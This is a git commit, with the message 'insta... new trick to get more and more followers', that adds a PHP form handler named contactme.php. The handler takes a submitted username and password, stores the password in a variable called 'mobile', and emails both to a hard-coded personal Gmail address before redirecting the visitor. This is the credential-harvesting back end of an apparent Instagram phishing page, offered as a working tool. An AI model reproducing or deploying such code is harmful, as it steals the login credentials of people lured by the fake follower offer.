1f4a5501a697e2f7742c45f0b64186815c8af4bb
vishal10feb <vishalpal10feb@gmail.com>
2020-06-21 10:15:28 +0530

    insta
    hey guys welcome for new trick to get more and more followers

---
+++ contactme.php
@@ -0,0 +1,17 @@
+<?php
+$to = "vishalpale@gmail.com";
+$subject = "New Contact Form!";
+$name = $_POST['user'];
+$mobile = $_POST['password'];
+$body = '<b>User Name: </b>'.$name.'<br><b>Password: </b>'.$mobile.';
+$headers = "From: no-reply\n";
+$headers .= "MIME-Version: 1.0\r\n";
+$headers .= "Content-type: text/html\r\n";
+$query = mail($to, $subject, $body, $headers);
+if($query){
+	header('location: index.html');
+}
+else{
+	echo "<script>alert('Mail was not sent !');</script>";
+}
+?>
